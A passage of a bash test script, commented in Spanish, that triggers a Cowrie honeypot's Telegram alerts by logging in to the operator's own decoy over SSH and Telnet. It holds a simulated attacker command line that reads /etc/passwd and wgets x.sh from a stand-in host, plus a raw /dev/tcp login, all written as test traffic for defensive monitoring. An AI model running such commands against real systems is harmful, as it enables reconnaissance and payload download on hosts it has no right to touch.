    export SSH_ASKPASS="$TMP/bin/dar-clave"
    export SSH_ASKPASS_REQUIRE=force
    SSH_OPC="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1"

    echo
    echo "=== Avisos del bot de Cowrie (sesion de verdad contra el senuelo) ==="

    if paso "[Cowrie via SSH] Login correcto + ACTOR NUEVO con sus ordenes"; then
        ssh $SSH_OPC -p "$SENUELO_SSH" "${SENUELO_USUARIO}@${SENUELO_IP}" "uname -a; cat /etc/passwd; wget http://203.0.113.9/x.sh" >/dev/null 2>&1 || true
        echo "     entrada hecha. El login llega al momento; el de las ordenes"
        echo "     (ACTOR NUEVO / GUION NUEVO) tarda unos 30 s en salir."
        respira
    fi

    # El fichero vacio tiene un SHA-256 conocido, e3b0c442...b855: real,
    # inofensivo y existe en VirusTotal, asi que el aviso se puede seguir
    # hasta el final sin subir nada que sea de verdad peligroso.
    if paso "[Cowrie] MUESTRA NUEVA (fichero vacio, e3b0c442...b855)"; then
        : > "$TMP/a.txt"
        scp $SSH_OPC -P "$SENUELO_SSH" "$TMP/a.txt" "${SENUELO_USUARIO}@${SENUELO_IP}:/tmp/" >/dev/null 2>&1 || true
        respira
    fi

    # Y por el otro protocolo, para ver que la cabecera lo distingue:
    # "[Cowrie via Telnet]" en vez de "[Cowrie via SSH]". El socket lo abre
    # bash; lo que se manda son las mismas pulsaciones que darias tu.
    if paso "[Cowrie via Telnet] Login correcto"; then
        # Todo en UN subshell, y por dos motivos. Uno: asi se abre una sola
        # conexion ---sondear antes con otra dejaria una sesion de mas en la
        # base de Cowrie, contando como visita lo que solo era mirar si el
        # puerto estaba---. Dos: un "exec" cuya redireccion falla mata al
        # shell que lo ejecuta, y aqui el que muere es el subshell.
        #
        # El "|| exit 1" no sobra: bash NO aborta el subshell al fallar ese
        # exec, sigue adelante, y el codigo final acabaria siendo el del
        # ultimo sleep ---o sea 0, y un puerto muerto pareceria un exito---.
        if (
            exec 3<>"/dev/tcp/${SENUELO_IP}/${SENUELO_TELNET}" || exit 1
            sleep 1; printf '%s\r' "$SENUELO_USUARIO" >&3
            sleep 1; printf '%s\r' "$SENUELO_CLAVE"   >&3
            sleep 1; printf 'id\r'                    >&3
            sleep 2
        ) >/dev/null 2>&1; then
            respira
        else falta "el 2223 del senuelo: no contesta"; fi
    fi
fi

# =========================================================================

echo
if [ -n "$SOLO" ]; then
    echo "probar-avisos: lanzado el paso $SOLO de $N."
else
    echo "probar-avisos: $N avisos lanzados."
fi
if [ "$SECO" -eq 1 ]; then
    echo "  (en seco: no se ha mandado nada a Telegram)"
else
    echo "  Los de Cowrie tardan un poco: el de las ordenes sale a los 30 s."
    echo "  El baneo automatico y el resumen de lo silenciado no salen con"
    echo "  sesiones propias ---tu IP esta en la lista blanca del plugin---:"
    echo "  llegan solos con trafico de fuera. Apartado 3.6.1.2."
fi
